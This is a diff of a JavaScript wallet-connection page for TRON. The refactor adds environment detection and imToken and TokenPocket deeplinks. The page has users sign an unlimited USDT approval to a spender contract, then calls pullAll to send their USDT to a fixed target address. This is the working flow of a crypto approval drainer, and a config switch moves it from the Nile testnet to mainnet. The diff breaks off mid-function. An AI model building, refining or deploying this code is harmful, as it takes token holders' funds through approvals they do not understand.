-   CONFIGURATION — Edit these values before deployment
+   CONFIG
 ============================================================ */
 const CONFIG = {
-
-  /* ---------------------------------------------------------
-     Network: Nile Testnet (https://nile.trongrid.io)
-     To switch to Mainnet, change NETWORK to 'mainnet'
-  --------------------------------------------------------- */
-  NETWORK: 'nile',   // 'nile' | 'mainnet'
-
-  /* ---------------------------------------------------------
-     TRC20 USDT contract address
-     Nile  testnet: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9'
-     Mainnet:       'TR7NHqjeKQyG5CiM2uM8i3wafT2QnqJ3Cm'
-  --------------------------------------------------------- */
+  NETWORK: 'nile',    // 'nile' | 'mainnet'
+  // Nile testnet TRC20 USDT
   USDT_CONTRACT: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9',
-
-  /* ---------------------------------------------------------
-     NileUSDT contract address — fill in after deploying
-     the contract on TronIDE / Nile testnet
-  --------------------------------------------------------- */
-  SPENDER_CONTRACT: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21', // deployed contract address
-
-  /* ---------------------------------------------------------
-     Target address — the address that receives all USDT
-  --------------------------------------------------------- */
-  TARGET_ADDRESS: 'TDEhUiK3kEfm4H9mH3cG9qBHfJ3L3mQ3K3',  // <-- REPLACE THIS
-
-  /* ---------------------------------------------------------
-     Chain IDs
-  --------------------------------------------------------- */
-  CHAIN_ID_NILE:    '0xcd8690dc',
-  CHAIN_ID_MAINNET: '0x2b6653dc',
-
-  /* ---------------------------------------------------------
-     RPC endpoints (used by tronWeb fallback)
-  --------------------------------------------------------- */
-  RPC_NILE:    'https://nile.trongrid.io',
-  RPC_MAINNET: 'https://api.trongrid.io',
-
-  /* ---------------------------------------------------------
-     Explorer base URLs
-  --------------------------------------------------------- */
+  // Deployed contract address - REPLACE WITH YOUR DEPLOYED ADDRESS
+  SPENDER_CONTRACT: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
+  // Target address for USDT
+  TARGET_ADDRESS: 'TYkhsAYUkwav55kZyQ69X8amCGVr8g2C21',
   EXPLORER_NILE:    'https://nilescan.io',
   EXPLORER_MAINNET: 'https://tronscan.org',
 };
@@ -516,734 +377,914 @@ const CONFIG = {
 ============================================================ */
 const UNLIMITED_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 const DECIMALS      = 6;
-const POLL_MS       = 3000;    // poll interval for tx confirmation
-const MAX_BLOCKS    = 19;      // blocks before considered final
-const MAX_POLL      = 40;      // max poll attempts (40 * 3s = 120s)
+const POLL_MS       = 3000;
+const MAX_BLOCKS    = 19;
+const MAX_POLL      = 40;
+const DEEPLINK_TIMEOUT_MS = 1200; // deeplink fallback trigger time
 
 /* ================================================================
-   STATE
+   APP STATE
 ============================================================ */
 const STATE = {
-  IDLE:      'idle',
-  CONNECTING:'connecting',
-  READY:     'ready',
-  APPROVING: 'approving',
-  APPROVE_OK:'approve_ok',
-  PULLING:   'pulling',
-  DONE:      'done',
-  FAIL:      'fail',
+  IDLE:'idle', CONNECTING:'connecting', READY:'ready',
+  APPROVING:'approving', APPROVE_OK:'approve_ok', PULLING:'pulling',
+  DONE:'done', FAIL:'fail'
 };
 
 let state     = STATE.IDLE;
-let tw        = null;       // tronWeb instance
-let wAddr     = null;       // wallet address (base58)
-let wType     = null;       // 'tronlink' | 'imtoken' | 'tp' | 'tronweb'
-let lastTx    = null;       // last transaction hash
-let modalCb   = null;       // modal confirm callback
-
-// Cached chain data
-let cacheBal   = null;
-let cacheAllow = null;
+let tw        = null;
+let wAddr     = null;
+let wType     = null;
+let lastTx    = null;
+let modalCb   = null;
+let cacheBal  = null;
+let cacheAllow= null;
+let debugMode = false;
 
 /* ================================================================
    UTILITIES
 ============================================================ */
 const $ = id => document.getElementById(id);
 
-function toast(msg, type) {
-  const t = $('toast');
-  t.className = 'toast' + (type ? ' ' + type : '');
-  t.textContent = msg;
-  t.classList.add('sh');
-  clearTimeout(t._t);
-  t._t = setTimeout(() => t.classList.remove('sh'), 7000);
+function toast(msg,type){
+  const t=$('toast');
+  t.className='toast'+(type?' '+type:'');
+  t.textContent=msg;t.classList.add('sh');
+  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('sh'),7000);
 }
-
-function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function copyTxt(text) {
-  if (!text || text === 'Querying...' || text === '---') return;
-  navigator.clipboard.writeText(text).then(() => toast('Copied: ' + text.slice(0, 8) + '...', 'ok')).catch(() => toast('Copy failed', 'er'));
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+function copyTxt(text){
+  if(!text||text==='Querying...'||text==='---')return;
+  navigator.clipboard.writeText(text).then(()=>toast('Copied: '+text.slice(0,8)+'...','ok')).catch(()=>toast('Copy failed','er'));
 }
+function fmtAmt(raw){if(raw==null||raw==='')return'---';return(Number(raw)/1e6).toFixed(DECIMALS).replace(/\.?0+$/,'')+' USDT';}
+function fmtAddr(addr){if(!addr)return'---';return addr.slice(0,6)+'...'+addr.slice(-4);}
+function isAddr(addr){return addr&&addr.length===34&&addr[0]==='T';}
+function getExplorerBase(){return CONFIG.NETWORK==='nile'?CONFIG.EXPLORER_NILE:CONFIG.EXPLORER_MAINNET;}
+function getTxUrl(tx){return getExplorerBase()+'/#/transaction/'+tx;}
+function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function s4(){return Math.random().toString(36).slice(2,10);}
 
-function fmtAmt(raw) {
-  if (raw == null || raw === '') return '---';
-  return (Number(raw) / 1e6).toFixed(DECIMALS).replace(/\.?0+$/, '') + ' USDT';
-}
+/* ================================================================
+   DEBUG LOGGER
+============================================================ */
+const Log = {
+  lines:[],
+  add(tag,msg,extra){
+    const now=new Date();
+    const ts=now.toISOString().slice(11,23);
+    const line={ts,tag,msg,extra:id=>'['+id+']'};
+    this.lines.push(line);
+    this.render();
+    console.log('[%s][%s] %s',tag,ts,msg,extra||'');
+  },
+  info(msg,extra){this.add('INFO',msg,extra);},
+  ok(msg,extra){this.add('OK',msg,extra);},
+  err(msg,extra){this.add('ERR',msg,extra);},
+  warn(msg,extra){this.add('WARN',msg,extra);},
+  deep(msg,extra){this.add('DEEPLINK',msg,extra);},
+  tx(msg,extra){this.add('TX',msg,extra);},
+  env(msg,extra){this.add('ENV',msg,extra);},
+  render(){
+    const el=$('dbgLog');
+    if(!el)return;
+    el.innerHTML=this.lines.slice(-50).map(l=>{
+      const tagColor={INFO:'info',OK:'ok',ERR:'err',WARN:'warn',DEEPLINK:'deep',TX:'tx',ENV:'info'}[l.tag]||'info';
+      return `<div class="dbg-line"><span class="dbg-ts">${l.ts}</span><span class="dbg-tag ${tagColor}">${l.tag}</span><span class="dbg-msg">${escHtml(l.msg)}</span></div>`;
+    }).join('');
+    el.scrollTop=el.scrollHeight;
+  }
+};
 
-function fmtAddr(addr) {
-  if (!addr) return '---';
-  return addr.slice(0, 6) + '...' + addr.slice(-4);
-}
+/* ================================================================
+   ENVIRONMENT DETECTION — the core of this refactor
+============================================================ */
+function detectWalletEnvironment(){
+  const ua=navigator.userAgent.toLowerCase();
+  const uaOrig=navigator.userAgent;
 
-function isAddr(addr) {
-  return addr && addr.length === 34 && addr[0] === 'T';
-}
+  // ---- Basic platform ----
+  const isMobile=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const isDesktop=!isMobile;
 
-function getExplorerBase() {
-  return CONFIG.NETWORK === 'nile' ? CONFIG.EXPLORER_NILE : CONFIG.EXPLORER_MAINNET;
-}
+  // ---- In-app browser detection ----
+  // These are the only reliable signals that we are inside a wallet's built-in browser
+  const isImTokenApp = ua.includes('imtoken') || ua.includes('tokenpocket');
+  const isTokenPocketApp = ua.includes('tokenpocket') || ua.includes('tpwallet');
+  const isTronLinkApp = !!(window.tronLink && window.tronLink.ready);
 
-function getTxUrl(tx) {
-  return getExplorerBase() + '/#/transaction/' + tx;
+  // ---- Injected provider detection ----
+  // TronLink browser extension (desktop)
+  const hasTronLink = !!(window.tronLink && window.tronLink.tronWeb && window.tronLink.ready);
+  // Direct tronWeb injection (imToken / TP in-app browsers, or standalone)
+  const hasTronWeb = !!(window.tronWeb && window.tronWeb.ready);
+  // TP's own JS SDK
+  const hasTPSDK = !!(window.TronWeb || window.tp || window.TPWallet);
+
+  // ---- Determine wallet type ----
+  let walletType = 'unknown';
+  let isInAppBrowser = false;
+  let isSystemBrowser = isMobile && !isImTokenApp && !isTokenPocketApp;
+
+  if(isImTokenApp || (hasTronWeb && hasTronLink===false && isMobile)){
+    walletType='imtoken'; isInAppBrowser=true; isSystemBrowser=false;
+  } else if(isTokenPocketApp || (hasTPSDK && isMobile)){
+    walletType='tokenpocket'; isInAppBrowser=true; isSystemBrowser=false;
+  } else if(hasTronLink){
+    walletType='tronlink'; isInAppBrowser=false; isSystemBrowser=isMobile;
+  } else if(hasTronWeb && !isMobile){
+    walletType='tronweb-standalone'; isInAppBrowser=false;
+  }
+
+  // ---- Can use injected provider? ----
+  // If TronLink or tronWeb is available and ready, use it directly
+  // This works BOTH in wallet in-app browser AND desktop
+  const canUseInjectedProvider = hasTronLink || hasTronWeb;
+
+  // ---- Can use deeplink? ----
+  // Only on system browsers (not inside wallet in-app browser)
+  const canUseDeepLink = isSystemBrowser && isMobile;
+
+  // ---- Should use WalletConnect? ----
+  // For desktop without TronLink extension
+  const shouldUseWalletConnect = isDesktop && !hasTronLink;
+
+  // ---- Network name ----
+  const networkName = CONFIG.NETWORK==='nile'?'Nile Testnet':'TRON Mainnet';
+
+  // ---- Build result ----
+  const result = {
+    isMobile, isDesktop,
+    isInAppBrowser, isSystemBrowser,
+    walletType,
+    canUseDeepLink, canUseInjectedProvider, shouldUseWalletConnect,
+    hasTronLink, hasTronWeb, hasTPSDK,
+    networkName,
+    ua: uaOrig,
+    // Recommended action
+    recommendedFlow: '',
+  };
+
+  // Determine recommended flow
+  if(canUseInjectedProvider){
+    result.recommendedFlow = 'injected-provider';
+    result.recommendedFlowLabel = 'Use injected TronWeb (wallet in-app browser or TronLink)';
+  } else if(canUseDeepLink){
+    result.recommendedFlow = 'deeplink';
+    result.recommendedFlowLabel = 'Open system browser deeplink';
+  } else if(shouldUseWalletConnect){
+    result.recommendedFlow = 'walletconnect';
+    result.recommendedFlowLabel = 'Use WalletConnect QR code';
+  } else {
+    result.recommendedFlow = 'none';
+    result.recommendedFlowLabel = 'No wallet detected';
+  }
+
+  return result;
 }
 
 /* ================================================================
    STEP UI
 ============================================================ */
-function stepSet(num, css, title, msg, txHash) {
-  const el = $('s' + num);
-  if (el) el.className = 'step ' + css;
-  if (title) $('s' + num + 't').textContent = title;
-  if (msg) {
-    let html = escHtml(msg);
-    if (txHash) {
-      html += '<br/><a class="txlink" href="' + getTxUrl(txHash) + '" target="_blank" rel="noopener">Tx: ' + fmtAddr(txHash) + ' view on explorer</a>';
+function stepSet(num,css,title,msg,txHash){
+  const el=$('s'+num);if(el)el.className='step '+css;
+  if(title)$('s'+num+'t').textContent=title;
+  if(msg){
+    let html=escHtml(msg);
+    if(txHash){
+      html+=`<br/><a class="txlink" href="${getTxUrl(txHash)}" target="_blank" rel="noopener">Tx: ${fmtAddr(txHash)} view on explorer</a>`;
     }
-    $('s' + num + 'm').innerHTML = html;
+    $('s'+num+'m').innerHTML=html;
   }
 }
-
-function escHtml(s) {
-  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function stepAllReset(){
+  const t=['','Connect Wallet','Chain Data','Approve (Unlimited)',
+    'Wait for Approval On-Chain','Pull USDT','Done'];
+  const m=['','Select imToken or TokenPocket',
+    'Query on-chain data after wallet connects',
+    'Sign to grant contract unlimited USDT allowance',
+    'Waiting for approval tx to be confirmed...',
+    'Call contract pullAll to transfer USDT to target',
+    'USDT has arrived at target address'];
+  for(let i=1;i<=6;i++)stepSet(i,'',t[i],m[i],null);
 }
 
-function stepAllReset() {
-  for (let i = 1; i <= 6; i++) {
-    const t = ['','Connect Wallet','Chain Data','Approve (Unlimited)',
-      'Wait for Approval On-Chain','Pull USDT','Done'];
-    const m = ['','Select imToken or TokenPocket',
-      'Query on-chain data after wallet connects',
-      'Sign to grant contract unlimited USDT allowance',
-      'Waiting for approval tx to be confirmed...',
-      'Call contract pullAll to transfer USDT to target',
-      'USDT has arrived at target address'];
-    stepSet(i, '', t[i], m[i], null);
-  }
-}
+/* ================================================================
+   ENV DISPLAY
+============================================================ */
+function renderEnvPanel(env){
+  const boolFmt=(v,label)=>{
+    const cls=v?'true':'false';
+    const txt=v?'YES':'NO';
+    return `<div class="env-line"><span class="env-key">${label}</span><span class="env-val ${cls}">${txt}</span></div>`;
+  };
+  const valFmt=(v,label)=>`<div class="env-line"><span class="env-key">${label}</span><span class="env-val">${v||'N/A'}</span></div>`;
 
-function showTxCard(tx) {
-  lastTx = tx;
-  $('txCard').style.display = 'block';
-  $('vTxHash').textContent = tx;
-  $('vExplorer').textContent = getTxUrl(tx);
-  $('vExplorer').onclick = () => copyTxt(getTxUrl(tx));
-}
-
-function showErrBox(msg) {
-  $('errBox').style.display = 'flex';
-  $('errTxt').textContent = msg;
-}
-
-function hideErrBox() {
-  $('errBox').style.display = 'none';
+  $('dbgEnv').innerHTML=[
+    boolFmt(env.isMobile,'isMobile'),
+    boolFmt(env.isInAppBrowser,'isInAppBrowser'),
+    boolFmt(env.isSystemBrowser,'isSystemBrowser'),
+    boolFmt(env.canUseInjectedProvider,'canUseInjectedProvider'),
+    boolFmt(env.canUseDeepLink,'canUseDeepLink'),
+    boolFmt(env.shouldUseWalletConnect,'shouldUseWalletConnect'),
+    boolFmt(env.hasTronLink,'hasTronLink'),
+    boolFmt(env.hasTronWeb,'hasTronWeb'),
+    boolFmt(env.hasTPSDK,'hasTPSDK'),
+    valFmt(env.walletType,'walletType'),
+    valFmt(env.recommendedFlow,'recommendedFlow'),
+    valFmt(env.networkName,'networkName'),
+    `<div class="env-line"><span class="env-key">ua (truncated)</span><span class="env-val warn">${env.ua.slice(0,80)}</span></div>`,
+  ].join('');
 }
 
 /* ================================================================
    MODAL
 ============================================================ */
-function openModal(title, bodyHtml, confirmText, isDanger, cb) {
-  $('mTitle').textContent = title;
-  $('mBody').innerHTML = bodyHtml;
-  const btn = $('mBtn');
-  btn.textContent = confirmText || 'Confirm';
-  btn.className = 'btn-yes' + (isDanger ? ' dp' : '');
-  modalCb = cb;
+function openModal(title,bodyHtml,confirmText,isDanger,cb){
+  $('mTitle').textContent=title;
+  $('mBody').innerHTML=bodyHtml;
+  const btn=$('mBtn');
+  btn.textContent=confirmText||'Confirm';
+  btn.className='btn-yes'+(isDanger?' dp':'');
+  modalCb=cb;
   $('modal').classList.add('sh');
 }
-function closeModal() {
-  $('modal').classList.remove('sh');
-  modalCb = null;
-}
+function closeModal(){$('modal').classList.remove('sh');modalCb=null;}
 
 /* ================================================================
-   WALLET DETECTION
+   DEEPLINK BUILDER — separated for testability
 ============================================================ */
 
 /**
- * Detect injected TronWeb (used by TronLink, imToken DApp browser,
- * TokenPocket DApp browser — works on both desktop and mobile).
- * This is the only wallet detection method used — no deeplinks.
+ * Build imToken deeplink URL.
+ * imToken supports: imtoken://tron/approve?contract=X&spender=Y&amount=Z
  */
-async function detectTronWeb() {
-  // Try window.tronLink first (TronLink browser extension)
-  if (window.tronLink && window.tronLink.ready) {
-    try {
-      const tw_ = window.tronLink.tronWeb;
-      const addr = tw_.defaultAddress?.base58 || tw_.address?.base58;
-      if (isAddr(addr)) {
-        tw = tw_;
-        wAddr = addr;
-        wType = 'tronlink';
-        return true;
-      }
-    } catch (e) { /* fall through */ }
-  }
+function buildImTokenDeeplink(){
+  const contract=encodeURIComponent(CONFIG.USDT_CONTRACT);
+  const spender=encodeURIComponent(CONFIG.SPENDER_CONTRACT);
+  const amount=encodeURIComponent(UNLIMITED_HEX);
+  const callback=encodeURIComponent(window.location.href);
+  return `imtoken://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&callback=${callback}`;
+}
 
-  // Try window.tronWeb directly (imToken / TP DApp browser)
-  if (window.tronWeb && window.tronWeb.ready) {
-    try {
-      const addr = window.tronWeb.defaultAddress?.base58 || window.tronWeb.address?.base58;
-      if (isAddr(addr)) {
-        tw = window.tronWeb;
-        wAddr = addr;
-        const ua = navigator.userAgent.toLowerCase();
-        wType = ua.includes('imtoken') ? 'imtoken' :
-                ua.includes('tokenpocket') ? 'tp' : 'tronweb';
-        return true;
-      }
-    } catch (e) { /* fall through */ }
-  }
+/**
+ * Build TokenPocket deeplink URL.
+ * TP supports: tokenpocket://tron/approve?contract=X&spender=Y&amount=Z&symbol=USDT&callback=...
+ */
+function buildTokenPocketDeeplink(){
+  const contract=encodeURIComponent(CONFIG.USDT_CONTRACT);
+  const spender=encodeURIComponent(CONFIG.SPENDER_CONTRACT);
+  const amount=encodeURIComponent(UNLIMITED_HEX);
+  const symbol=encodeURIComponent('USDT');
+  const callback=encodeURIComponent(window.location.href);
+  return `tokenpocket://tron/approve?contract=${contract}&spender=${spender}&amount=${amount}&symbol=${symbol}&callback=${callback}`;
+}
 
-  return false;
+/**
+ * Show deeplink fallback UI.
+ * Called when deeplink did not trigger a page leave within timeout.
+ */
+function showDeeplinkFallback(walletType){
+  $('dlCountdown').classList.add('hd');
+  const fb=$('fallbackBox');
+  fb.classList.remove('hd');
+  const walletName=walletType==='imtoken'?'imToken':'TokenPocket';
+  const dlUrl=walletType==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
+  const dlUrlDisplay=dlUrl.length>60?dlUrl.slice(0,60)+'...':dlUrl;
+
+  $('fbTitle').textContent=walletName+' could not be opened';
+
+  $('fbBody').innerHTML=`
+    <div style="font-size:12px;color:var(--err);margin-bottom:10px">
+      The wallet app was not detected or the deeplink failed to open.
+    </div>
+    <div style="font-size:11px;color:var(--mute);margin-bottom:8px">
+      Fallback options:
+    </div>
+    <div style="display:flex;flex-direction:column;gap:6px">
+      <div style="font-size:11px;color:var(--mute2);padding:6px 0">
+        Option 1: Copy the link below and open it in ${walletName}'s built-in browser
+      </div>
+      <button class="fb-btn" onclick="App.copyDeeplinkUrl('${walletType}')" style="word-break:break-all;font-size:11px;padding:8px">
+        Copy ${walletName} deeplink
+      </button>
+      <div style="font-size:11px;color:var(--mute2);padding:6px 0;margin-top:4px">
+        Option 2: Open this page directly in ${walletName}'s built-in browser
+      </div>
+      <button class="fb-btn" onclick="App.copyPageUrl()">
+        Copy page URL (open in ${walletName})
+      </button>
+      <div style="font-size:11px;color:var(--mute2);padding:6px 0;margin-top:4px">
+        Option 3: Install ${walletName} wallet
+      </div>
+      <a class="fb-btn" href="https://token.im" target="_blank" rel="noopener" style="display:block;text-decoration:none">
+        Download imToken
+      </a>
+      <a class="fb-btn" href="https://www.tokenpocket.io" target="_blank" rel="noopener" style="display:block;text-decoration:none">
+        Download TokenPocket
+      </a>
+    </div>
+  `;
+
+  // Show which deeplink was attempted
+  $('wbtnLabel').textContent='Deeplink failed. Try fallback options above.';
+
+  Log.warn('Deeplink fallback shown for: '+walletType);
+  Log.warn('Attempted deeplink: '+dlUrlDisplay);
+}
+
+/**
+ * Trigger deeplink with fallback timer.
+ * @param {string} wallet - 'imtoken' | 'tp'
+ */
+function triggerDeeplink(wallet){
+  const url=wallet==='imtoken'?buildImTokenDeeplink():buildTokenPocketDeeplink();
+  const walletName=wallet==='imtoken'?'imToken':'TokenPocket';
+
+  Log.deep('Opening deeplink for: '+walletName);
+  Log.deep('URL: '+url);
+
+  // Show countdown
+  $('fallbackBox').classList.add('hd');
+  $('dlCountdown').classList.remove('hd');
+  let sec=Math.ceil(DEEPLINK_TIMEOUT_MS/1000);
+  $('dlCountdownSec').textContent=sec;
+
+  const countdownInterval=setInterval(()=>{
+    sec--;
+    $('dlCountdownSec').textContent=sec;
+    if(sec<=0){
+      clearInterval(countdownInterval);
+      $('dlCountdown').classList.add('hd');
+      showDeeplinkFallback(wallet);
+    }
+  },1000);
+
+  // Open the deeplink URL
+  // This MUST be synchronous inside the click handler to avoid browser blocking
+  window.location.href=url;
+
+  // If page is still here after timeout, show fallback
+  // (browser may block navigation; we catch it via the timer above)
+  setTimeout(()=>{
+    clearInterval(countdownInterval);
+  },DEEPLINK_TIMEOUT_MS+200);
 }
 
 /* ================================================================
    CHAIN QUERIES
 ============================================================ */
-
-/**
- * Get USDT balance of an address.
- */
-async function queryBal(addr) {
-  if (!tw) throw new Error('TronWeb not initialized');
-  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
-  const r = await c.balanceOf(addr).call();
-  return r ? r.toString() : '0';
+async function queryBal(addr){
+  if(!tw)throw new Error('TronWeb not initialized');
+  const c=await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const r=await c.balanceOf(addr).call();
+  return r?r.toString():'0';
 }
-
-/**
- * Get allowance granted to SPENDER_CONTRACT by owner.
- */
-async function queryAllow(owner, spender) {
-  if (!tw) throw new Error('TronWeb not initialized');
-  const c = await tw.contract().at(CONFIG.USDT_CONTRACT);
-  const r = await c.allowance(owner, spender).call();
-  return r ? r.toString() : '0';
+async function queryAllow(owner,spender){
+  if(!tw)throw new Error('TronWeb not initialized');
+  const c=await tw.contract().at(CONFIG.USDT_CONTRACT);
+  const r=await c.allowance(owner,spender).call();
+  return r?r.toString():'0';
 }
-
-/**
- * Poll transaction until confirmed or failed.
- * Returns: 'confirmed' | 'finalized' | 'failed' | null (pending)
- */
-async function pollTx(tx) {
-  try {
-    const info = await tw.trx.getTransactionInfo(tx);
-    if (!info || Object.keys(info).length === 0) return null;
-    if (info.receipt && info.receipt.result === 'SUCCESS') {
-      const blk = info.confirmation_number || 0;
-      return blk >= MAX_BLOCKS ? 'finalized' : 'confirmed';
+async function pollTx(tx){
+  try{
+    const info=await tw.trx.getTransactionInfo(tx);
+    if(!info||Object.keys(info).length===0)return null;
+    if(info.receipt&&info.receipt.result==='SUCCESS'){
+      const blk=info.confirmation_number||0;
+      return blk>=MAX_BLOCKS?'finalized':'confirmed';
     }
-    // Tx existed but failed
     throw new Error('Transaction failed on-chain');
-  } catch (e) {
-    if (e.message && e.message.toLowerCase().includes('transaction not found')) {
-      return null; // still in mempool
-    }
+  }catch(e){
+    if(e.message&&e.message.toLowerCase().includes('transaction not found'))return null;
     throw e;
   }
 }
 
 /* ================================================================
-   CORE FLOW
+   WALLET CONNECTION — unified entry point
 ============================================================ */
+async function connectWalletFlow(preferredWallet){
+  const env=detectWalletEnvironment();
+  Log.env('Environment detection result',env);
+  Log.info('connectWalletFlow() called, preferredWallet='+preferredWallet);
+  Log.info('recommendedFlow='+env.recommendedFlow+', walletType='+env.walletType);
 
-/**
- * 1. Connect wallet
- */
-async function connectWallet(preferred) {
-  if (state === STATE.CONNECTING || state === STATE.APPROVING || state === STATE.PULLING) {
-    toast('Operation in progress, please wait...', 'wn');
+  // Pre-flight CONFIG validation
+  if(!isAddr(CONFIG.USDT_CONTRACT)){
+    toast('CONFIG.USDT_CONTRACT is invalid','er');Log.err('Invalid USDT_CONTRACT: '+CONFIG.USDT_CONTRACT);return;
+  }
+  if(!isAddr(CONFIG.SPENDER_CONTRACT)){
+    toast('CONFIG.SPENDER_CONTRACT is not set','er');Log.err('SPENDER_CONTRACT not configured');return;
+  }
+
+  // ---- ROUTE 1: Injected provider (wallet in-app browser OR desktop TronLink) ----
+  if(env.canUseInjectedProvider){
+    Log.info('Routing: injected-provider flow');
+    await connectViaInjectedProvider(env);
     return;
   }
 
-  state = STATE.CONNECTING;
-  stepSet(1, 'on', 'Connect Wallet', 'Detecting wallet...', null);
-  setBtns(true);
-
-  try {
-    // Validate CONFIG
-    if (!isAddr(CONFIG.USDT_CONTRACT)) throw new Error('CONFIG.USDT_CONTRACT is not a valid T-address');
-    if (!isAddr(CONFIG.SPENDER_CONTRACT)) throw new Error('CONFIG.SPENDER_CONTRACT is not set or invalid (must be T-address)');
-    if (!isAddr(CONFIG.TARGET_ADDRESS)) throw new Error('CONFIG.TARGET_ADDRESS is not set or invalid');
-
-    const found = await detectTronWeb();
-    if (!found) {
-      throw new Error('No wallet detected. Please install TronLink extension (desktop) or open in imToken/TokenPocket DApp browser (mobile).');
+  // ---- ROUTE 2: System browser deeplink (mobile, no injected wallet) ----
+  if(env.canUseDeepLink){
+    Log.info('Routing: deeplink flow, preferredWallet='+preferredWallet);
+    if(!preferredWallet){
+      // No specific wallet chosen, show both options
+      Log.warn('No wallet selected, user should tap a button');
+      $('wbtnLabel').textContent='Select a wallet:';
+      return;
     }
+    // Trigger deeplink — must be synchronous call from click handler
+    Log.info('Triggering deeplink for: '+preferredWallet);
+    triggerDeeplink(preferredWallet);
+    return;
+  }
 
-    // Verify network
-    try {
-      const chainId = await tw.trx.getChainParameters?.()?.then?.(() => tw.trx.getNetworkParameters?.()) || null;
-      const blockHeader = await tw.trx.getBlockHeader?.() || {};
-      // Check fullnode
-      const node = tw.fullNode?.url || '';
-      const isNile = node.includes('nile') || CONFIG.NETWORK === 'nile';
-      // Force check via CONFIG since some versions don't expose chainId easily
-      if (CONFIG.NETWORK === 'nile' && !node.includes('nile') && !node.includes('api')) {
-        // Warn but don't block — user may be using Nile RPC but on wrong config
-      }
-    } catch (e) { /* network check non-fatal */ }
+  // ---- ROUTE 3: Desktop without wallet ----
+  if(env.shouldUseWalletConnect){
+    Log.warn('WalletConnect not implemented — please install TronLink');
+    toast('Please install TronLink extension in your browser, or open this page in imToken/TokenPocket DApp browser','wn');
+    showDeeplinkFallback('tronlink');
+    return;
+  }
 
-    wAddr = tw.defaultAddress?.base58 || tw.address?.base58;
-    if (!isAddr(wAddr)) throw new Error('Wallet address is invalid');
+  // ---- ROUTE 4: Completely unknown ----
+  Log.err('No wallet detected. ua='+env.ua.slice(0,100));
+  toast('No wallet detected. Please open in imToken or TokenPocket DApp browser','er');
+  $('wbtnLabel').textContent='No wallet detected. Please use imToken/TokenPocket DApp browser.';
+}
 
-    // Update UI: connected
-    $('connBadge').textContent = wType === 'tronlink' ? 'TronLink' :
-                                   wType === 'imtoken'  ? 'imToken' :
-                                   wType === 'tp'       ? 'TokenPocket' : 'Wallet';
-    $('connBadge').className = 'badge ok';
-    $('netBadge').textContent  = CONFIG.NETWORK === 'nile' ? 'Nile' : 'Mainnet';
-    $('netBadge').className    = 'badge ' + (CONFIG.NETWORK === 'nile' ? 'nile' : 'mainnet');
+/* ================================================================
+   CONNECT VIA INJECTED PROVIDER
+============================================================ */
+async function connectViaInjectedProvider(env){
+  Log.info('Attempting injected provider connection...');
 
-    stepSet(1, 'ok', 'Connect Wallet', 'Connected: ' + fmtAddr(wAddr), null);
+  // Try window.tronLink first
+  if(window.tronLink&&window.tronLink.tronWeb&&window.tronLink.ready){
+    tw=window.tronLink.tronWeb;
+    wAddr=tw.defaultAddress?.base58||tw.address?.base58;
+    if(isAddr(wAddr)){
+      wType=env.walletType==='unknown'?'tronlink':env.walletType;
+      Log.ok('Connected via TronLink, address='+wAddr);
+    }
+  }
 
-    // Show info panel
-    $('walletArea').style.display = 'none';
-    $('infoArea').style.display = 'block';
+  // Fallback: window.tronWeb directly (imToken/TP DApp browser)
+  if(!tw&&window.tronWeb&&window.tronWeb.ready){
+    tw=window.tronWeb;
+    wAddr=tw.defaultAddress?.base58||tw.address?.base58;
+    if(isAddr(wAddr)){
+      const ua=navigator.userAgent.toLowerCase();
+      wType=ua.includes('imtoken')?'imtoken':ua.includes('tokenpocket')?'tokenpocket':'tronweb';
+      Log.ok('Connected via tronWeb (in-app browser), address='+wAddr+', wType='+wType);
+    }
+  }
 
-    // Fill addresses
-    $('vAddr').textContent     = wAddr;
-    $('vUsdt').textContent     = CONFIG.USDT_CONTRACT;
-    $('vSpender').textContent  = CONFIG.SPENDER_CONTRACT;
-    $('vTarget').textContent   = CONFIG.TARGET_ADDRESS;
-    $('vNet').textContent      = CONFIG.NETWORK === 'nile' ? 'Nile Testnet' : 'TRON Mainnet';
+  if(!tw||!isAddr(wAddr)){
+    Log.err('Could not get address from injected provider');
+    toast('Could not read wallet address. Try refreshing the page.','er');
+    return;
+  }
 
-    // Query chain data
+  // Update UI
+  $('connBadge').textContent=wType==='tronlink'?'TronLink':
+                              wType==='imtoken'?'imToken':
+                              wType==='tokenpocket'?'TokenPocket':'Wallet';
+  $('connBadge').className='badge ok';
+  $('netBadge').textContent=CONFIG.NETWORK==='nile'?'Nile':'Mainnet';
+  $('netBadge').className='badge '+(CONFIG.NETWORK==='nile'?'nile':'mainnet');
+
+  // Show env in badge row
+  ['im','tp'].forEach(w=>{
+    const el=$(w+'Badge_');
+    if(el)el.remove();
+  });
+
+  // Update step 1
+  stepSet(1,'ok','Connect Wallet','Connected: '+fmtAddr(wAddr)+' via '+wType,null);
+  stepSet(2,'on','Chain Data','Querying on-chain data...',null);
+
+  // Show info panel, hide wallet area
+  $('walletArea').style.display='none';
+  $('infoArea').classList.remove('hd');
+
+  $('vAddr').textContent=wAddr;
+  $('vUsdt').textContent=CONFIG.USDT_CONTRACT;
+  $('vSpender').textContent=CONFIG.SPENDER_CONTRACT;
+  $('vTarget').textContent=CONFIG.TARGET_ADDRESS;
+  $('vNet').textContent=CONFIG.NETWORK==='nile'?'Nile Testnet':'TRON Mainnet';
+
+  state=STATE.CONNECTING;
+
+  try{
     await refreshChainData();
-
-    state = STATE.READY;
-
-  } catch (e) {
-    state = STATE.FAIL;
-    stepSet(1, 'fail', 'Connect Wallet', 'Connection failed: ' + (e.message || String(e)), null);
-    showErrBox('Wallet error: ' + (e.message || String(e)));
-    toast('Connection failed: ' + (e.message || String(e)), 'er');
-    setBtns(false);
+    state=STATE.READY;
+  }catch(e){
